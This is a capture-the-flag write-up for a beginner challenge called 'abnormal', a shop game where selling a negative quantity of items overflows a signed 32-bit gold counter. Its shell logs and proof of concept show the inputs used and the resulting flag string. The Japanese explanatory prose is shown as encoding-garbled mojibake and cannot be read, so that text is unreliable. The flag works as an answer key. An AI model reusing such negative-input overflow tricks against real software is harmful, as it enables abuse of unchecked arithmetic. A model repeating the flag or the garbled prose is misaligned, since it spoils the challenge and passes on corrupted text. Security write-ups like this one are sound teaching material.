# abnormal (BinaryExploitation, beginner) writeup
æ•´æ•°ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®è„†å¼±æ€§ã‚’èµ·ã“ã—ã¦æ‰€æŒé‡‘ã‚’ãƒ—ãƒ©ã‚¹ã«ã‚‚ã£ã¦ã„ãã€flag ã‚’è³¼å…¥ã™ã‚‹å•é¡Œã€‚  
æ‰€æŒã—ã¦ã„ã‚‹ã‚¢ã‚¤ãƒ†ãƒ ã‚’å£²ã‚‹ã“ã¨ãŒã§ãæ‰€æŒæ•°ä»¥ä¸Šã¯å£²ã‚‹ã“ã¨ãŒã§ããªã„ãŒã€ãƒã‚¤ãƒŠã‚¹ã®å€¤ã®ãƒã‚§ãƒƒã‚¯ãŒã•ã‚Œã¦ã„ãªã„ã®ã§æ•´æ•°ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã«ã‚ˆã£ã¦æ‰€æŒé‡‘ã‚’å¢—ã‚„ã™ã“ã¨ãŒã§ãã‚‹ã€‚

## TL;DL;
1. nc ã§æ¥ç¶šå¾Œã« 2 (sell) ã‚’é¸æŠã™ã‚‹
2. æ•´æ•°ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã•ã›ã‚‹ãŸã‚ã«ã€2 (Legendary Sword) ã‚’ -10000 å€‹å£²ã‚‹
3. 32bit int ã§ -2200000000 ãŒåŠ ç®—ã•ã‚ŒãŸã“ã¨ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒç™ºç”Ÿã—ã€æ‰€æŒé‡‘ãŒå¤§ããªãƒ—ãƒ©ã‚¹ã«ãªã£ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹
4. 1 (buy) ã‚’é¸æŠå¾Œã« 4 (flag) ã‚’é¸æŠã—ã¦ flag ã‚’è¡¨ç¤ºã•ã›ã‚‹ 


## Details
ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ FLAG ã‚’è²·ã†ã“ã¨ã®ã§ãã‚‹ã‚·ãƒ§ãƒƒãƒ—ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚‹ã€‚ã ãŒã€FLAG ã¯ 9,999,999 å††ã¨é«˜é¡ã§æŒã¡ç‰©ã‚’ã™ã¹ã¦å£²å´ã—ã¦ã‚‚è²·ãˆãªã„ãŸã‚ã€è„†å¼±æ€§ã‚’ã¤ã„ã¦æ‰€æŒé‡‘ã‚’å¢—ã‚„ã™å¿…è¦ãŒã‚ã‚‹ã€‚  
![](./images/readme.png)


ã„ã‚ã„ã‚è©¦ã—ã¦ã¿ã‚‹ã¨ã€æ‰€æŒé‡‘ã‚’å¢—ã‚„ã›ãã†ãªç®‡æ‰€ã¨ã—ã¦ã€Œå£²å´ã§æŒ‡å®šã™ã‚‹å€‹æ•°ã€ãŒæ€ªã—ã„ã®ã§ã¯ãªã„ã‹ã¨æ¨æ¸¬ã§ãã‚‹ã€‚è©¦ã—ã«ä¼èª¬ã®å‰£ã®å£²å´æ•°ã« `2` ã‚’æŒ‡å®šã™ã‚‹ã¨å£²å´ã§ããªã„åˆ¤å®šã«ãªã‚‹ãŒã€`-1` ã‚’æŒ‡å®šã™ã‚‹ã¨å£²å´ãŒæˆç«‹ã—æ‰€æŒé‡‘ãŒãƒã‚¤ãƒŠã‚¹ã«ãªã‚‹ã€‚

![](./images/writeup2.png)

å£²å´ã®å‡¦ç†ã«ã¤ã„ã¦ãƒªãƒãƒ¼ã‚¹ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã‚’è¡Œã†ã¨ã€å€‹æ•°ã‚ˆã‚Šå¤§ãã„å ´åˆã«ã¤ã„ã¦ã®åˆ†å²ã¯ã‚ã‚‹ãŒãƒã‚¤ãƒŠã‚¹ã®å ´åˆã®åˆ†å²å‡¦ç†ã¯ãªãã€æ¤œè¨¼ã‚‚ãªã—ã«æ‰€æŒé‡‘ã«å¯¾ã—ã¦æ¼”ç®—å‡¦ç†ã‚’è¡Œã£ã¦ã„ã‚‹ã€‚æ‰€æŒé‡‘ã®å¤‰æ•°ã¯ã€Œç¬¦å·ä»˜ã32bitã®æ•´æ•°ã€(signed int32)ã§ã‚ã‚‹ãŸã‚ã€éå¸¸ã«å¤§ããªãƒã‚¤ãƒŠã‚¹ã®å€‹æ•°ã‚’ä¸ãˆã‚Œã°æ•´æ•°ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒèµ·ã“ã‚Šãƒ—ãƒ©ã‚¹ã«é€†è»¢ã™ã‚‹ã¯ãšã§ã‚ã‚‹ã€‚
![](./images/writeup1.png) 

ç¬¦å·ä»˜ã 32bit ã®ä¸‹é™å€¤ã¯ -2,147,483,648 ï¼ˆ-2^31ï¼‰ã§ã‚ã‚‹ãŸã‚ã€ä¼èª¬ã®å‰£ã® 220,000 å††ã‚’ -10,000 å€‹ (= -2,200,000,000) å£²ã‚‹ã“ã¨ã§ç¬¦å·ãŒåè»¢ã—ãã†ã§ã‚ã‚‹ã€‚å®Ÿè¡Œã—ãŸçµæœãŒä»¥ä¸‹ã€‚

```shell=
=== ğŸ›’ What would you like to sell? ===
 1. Herb - 10 yen 
 2. Legendary Sword - 220000 yen 

Select an item to sell: > 2
How many Legendary Sword do you want to sell? (you have: 1): > -10000
Thank you :)

+================= Player Status =================+
| ğŸ’° Gold: 2094968296                            |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
```
æ‰€æŒé‡‘ãŒçˆ†å¢—ã—ã¦ FLAG ãŒè²·ãˆã‚‹æ‰€æŒé‡‘ã¨ãªã£ãŸãŸã‚ã€FLAG ã‚’è³¼å…¥ã—ã¦ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¯å®Œé‚ã§ã‚ã‚‹ã€‚
```shell=
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 1

=== ğŸ›ï¸ What would you like to buy? ===
 1. Torch - 10 yen
 2. Holy Water - 20 yen
 3. Great Stone - 800 yen
 4. FLAG - 9999999 yen 

Select an item to buy: 4
ğŸ‰ Congratulations! Here is your flag:
flag{Th3_m1nu5_cr33p5_b3y0nd_ch405}
```

ã¡ãªã¿ã«ç´°ã‹ã„åŸç†ã¾ã§ã‚ã‹ã‚‰ãšã¨ã‚‚ã€ã²ãŸã™ã‚‰ã«ãƒã‚¤ãƒŠã‚¹ã®å€¤ã‚’å…¥ã‚Œç¶šã‘ã‚Œã°ãã®ã†ã¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã™ã‚‹ã®ã§ã€ãƒã‚¤ãƒŠã‚¹ã®æ‰€æŒé‡‘ã«ãƒ”ãƒ³ã¨æ¥ãŸæ–¹ãŒã„ã‚Œã°ç²˜ã‚Šç¶šã‘ã‚‹ã“ã¨ã§ã„ã¤ã‹è§£ã‘ã‚‹ã¯ãšã§ã‚ã‚‹ã€‚

```shell=
$ ./bin/abnormal 

+================= Player Status =================+
| ğŸ’° Gold: 1000                                  |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 2

=== ğŸ›’ What would you like to sell? ===
 1. Herb - 10 yen 
 2. Legendary Sword - 220000 yen 

Select an item to sell: > 1
How many Herb do you want to sell? (you have: 100): > -10000000
Thank you :)

+================= Player Status =================+
| ğŸ’° Gold: -99999000                             |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 2

=== ğŸ›’ What would you like to sell? ===
 1. Herb - 10 yen 
 2. Legendary Sword - 220000 yen 

Select an item to sell: > 2
How many Legendary Sword do you want to sell? (you have: 1): > -1000000
Thank you :)

+================= Player Status =================+
| ğŸ’° Gold: -1056666904                           |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 2   

=== ğŸ›’ What would you like to sell? ===
 1. Herb - 10 yen 
 2. Legendary Sword - 220000 yen 

Select an item to sell: > 1
How many Herb do you want to sell? (you have: 100): > -100000000   
Thank you :)

+================= Player Status =================+
| ğŸ’° Gold: -2056666904                           |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 2

=== ğŸ›’ What would you like to sell? ===
 1. Herb - 10 yen 
 2. Legendary Sword - 220000 yen 

Select an item to sell: > 1
How many Herb do you want to sell? (you have: 100): > -100000000
Thank you :)

+================= Player Status =================+
| ğŸ’° Gold: 1238300392                            |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
```

## flag
`flag{Th3_m1nu5_cr33p5_b3y0nd_ch405}`

## Full PoC
```shell=
$ nc localhost 8101
=================================================
      _____ _ _       _____ _                
     |  ___| (_)_ __ |  ___| | ___  _ __     
     | |_  | | | '_ \| |_  | |/ _ \| '_ \    
     |  _| | | | |_) |  _| | | (_) | |_) |   
     |_|   |_|_| .__/|_|   |_|\___/| .__/    
               |_|                 |_|       
                                              
           Welcome to Flip-Flop Shop!          
=================================================


+================= Player Status =================+
| ğŸ’° Gold: 1000                                  |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 2

=== ğŸ›’ What would you like to sell? ===
 1. Herb - 10 yen 
 2. Legendary Sword - 220000 yen 

Select an item to sell: > 2
How many Legendary Sword do you want to sell? (you have: 1): > -10000
Thank you :)

+================= Player Status =================+
| ğŸ’° Gold: 2094968296                            |
|                                                |
| ğŸ’ Inventory:                                  |
|   - Herb            x 100                      |
|   - Legendary Sword x 1                        |
+================================================+
Choose an action:
 1. Buy
 2. Sell
 3. Exit
> > 1

=== ğŸ›ï¸ What would you like to buy? ===
 1. Torch - 10 yen
 2. Holy Water - 20 yen
 3. Great Stone - 800 yen
 4. FLAG - 9999999 yen 

Select an item to buy: 4
ğŸ‰ Congratulations! Here is your flag:
flag{Th3_m1nu5_cr33p5_b3y0nd_ch405}
```